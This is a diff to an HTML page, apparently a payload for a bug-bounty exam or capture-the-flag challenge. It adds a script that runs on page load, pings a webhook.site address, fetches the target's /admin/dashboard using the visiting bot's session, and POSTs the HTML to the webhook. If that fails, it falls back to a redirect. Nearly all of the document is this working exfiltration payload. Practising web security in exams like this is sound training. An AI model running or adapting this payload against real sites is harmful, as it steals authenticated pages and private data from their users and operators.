@@ -2,7 +2,32 @@
 <html>
 <body>
     <script>
-  window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/69e37c20bee6d6b7c662cdec";
-</script>
+        async function captureFlag() {
+            try {
+                // 1. Tell your webhook the hunt has started
+                fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/HUNT_STARTED');
+
+                // 2. Try to grab the Admin Dashboard content
+                const response = await fetch('https://bugbounty-exam.hashacademy.co/admin/dashboard');
+                const html = await response.text();
+
+                // 3. Exfiltrate the HTML to your webhook
+                // We use a POST request here because HTML can be long
+                await fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: html
+                });
+
+            } catch (err) {
+                // 4. If fetch fails (CORS), we use the "Redirect Leak"
+                // This forces the bot to go to the admin page, then we hope 
+                // a secondary XSS triggers. 
+                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
+            }
+        }
+
+        captureFlag();
+    </script>
 </body>
 </html>
